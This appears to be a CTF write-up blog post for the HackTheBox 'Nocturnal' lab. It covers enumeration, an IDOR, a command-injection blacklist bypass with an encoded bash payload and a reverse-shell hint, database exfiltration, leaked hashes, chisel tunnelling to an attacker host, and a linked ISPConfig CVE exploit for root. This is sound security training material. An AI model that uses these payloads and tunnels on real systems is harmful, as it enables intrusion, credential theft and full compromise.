---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "HackTheBox Nocturnal Walkthrough - Pentest Lab Notes"
date: 2025-09-23 12:00:00 -0500  # Adjust timezone if needed
categories: [hackthebox, walkthrough]
tags: [ctf, enumeration, exploit, nocturnal, writeups, htb, writeups ]
author: h4ck3rfirst
excerpt: "Detailed notes on exploiting the Nocturnal machine in HackTheBox Pentest Labs."
---

# Nocturnal - HackTheBox Walkthrough

**Difficulty**: Easy  
**OS**: Linux  
**IP**: `10.10.11.64`  
**Author**: h4ck3rfirst

---

## 🧭 Enumeration

### 🔎 Nmap Scan

```
nmap -A -sC -sV -Pn 10.10.11.64
```
Results:

22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp  open  http    nginx 1.18.0 (Ubuntu)

   SSH is not immediately exploitable. Web port (80) is the main focus.

### 🌐 Web Enumeration
📌 Add Hostname

Add to /etc/hosts:
```
10.10.11.64 nocturnal.htb
```
**📁 Gobuster**
```
gobuster dir -u http://nocturnal.htb/ -w /usr/share/wordlists/dirb/common.txt
```
Found paths:

/admin.php            (302 → login.php)   
/backups              (301)    
/index.php            (200)   
/uploads              (403)   

**🔓 IDOR Vulnerability**

Go with basic Register/login funtions   

Download endpoint observed:   ```
/view.php?username=test&file=sample.pdf   ```

👤 Username Enumeration (FFUF)  / Burpsuite   
```
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=sample.pdf' -H 'Cookie: PHPSESSID=YOUR_SESSION' -fs 2985
```
Valid users found:

    admin

    amanda

    tobias

    test

**🔐 Amanda's File**

Amanda’s file privacy.odt revealed a temporary password from IT.

   Attempting SSH login with Amanda's credentials failed.   
   
   However, using them on the web login worked — Amanda has access to the /admin.php panel.

   Go to admin planel

  Review all that file will found sqlite3 db which saving the login credentical 

  Their is Backups option in which Os injection working 
  
**💥 Command Injection via Weak Blacklist**

admin.php source review showed: ```$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];```

Input passed directly to: ```zip -P $password backups/...```

**🧪 Bypass in Burpsuite**

Used:

   \r\n → to inject new command

  %09 \t → for space

  Use encoding for reverse shell 

Payload example (POST param password):

  ```%0abash%09-c%09"whoami"```
  
  Whoami replace with reverse shell payload

### 🛠️ File Exfiltration

Discovered the file:
```
./nocturnal_database/nocturnal_database.db
```
Used base64 encoding to exfiltrate the contents via the injection:

base64 ./nocturnal_database/nocturnal_database.db > /tmp/db.txt

Then downloaded the file from web or created a downloadable backup.

**🔑 Credentials from Database**

Username	Hash (MD5)	Password

admin	d725aeba143f575736b07e045d8ceebb	N/A

amanda	df8b20aa0c935023f99ea58358fb63c4	N/A

tobias	55c82b1-----------------d5061d	s-owmo---------al--se

kavi	f38cde1654b39fea2bd4f72f1ae4cdda	kavi

e0Al5	101ad4543a96a7fd84908fd0d802e7db	N/A

Only tobias was allowed SSH access.
## 🐚 Shell Access (User)

```ssh tobias@10.10.11.64```
 Password: slo-----------------e

Now we have a limited shell as tobias.


## 🚀 Privilege Escalation
### 🔎 Local Web Service Discovery

From the shell:
```
netstat -tulnp | grep 8080
```
Revealed a local-only service running on 127.0.0.1:8080.
**🧰 Chisel Port Forwarding**
🖥️ Attacker (Your Machine):
```
chisel server -p 9001 --reverse
```

### 🐧 Victim (Tobias Shell):
```./chisel client YOUR-IP:9001 R:8080:127.0.0.1:8080 ``` 
OR
```ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb  ```   

Now browse http://localhost:8080 on your machine to access ISPConfig.

**⚡ Exploiting ISPConfig (CVE-2023-46818)**

   ISPConfig version: 3.2.2

   Vulnerable to PHP code injection as root.

 Reference:

  GitHub PoC 
  
  https://github.com/bipbopbup/CVE-2023-46818-python-exploit/blob/main/exploit.py

 💣 Successful Payload:

Used the exploit to inject PHP and achieve root shell.

### 🏁 Summary

Phase	Technique / Vulnerability   
Enumeration	Nmap + Gobuster   
Exploitation #1	IDOR (Insecure Direct Object Reference)   
Exploitation #2	Weak blacklist → Command injection    
Post-Exploitation	Database exfil → Creds → SSH   
Privilege Escalation	Local-only service → Chisel → CVE RCE   

Root Access	CVE-2023-46818 via ISPConfig    

## 🧠 Key Learnings

    Never rely solely on blacklists for input sanitization.

    Always secure local services or run them as unprivileged users.

    Exposing internal source code via web admin panels can be fatal.

    Chaining multiple "small" misconfigs = full system compromise.

### 🏆 Flags

    User: HTB{...}

    Root: HTB{...}

    Exploit responsibly. For educational purposes only.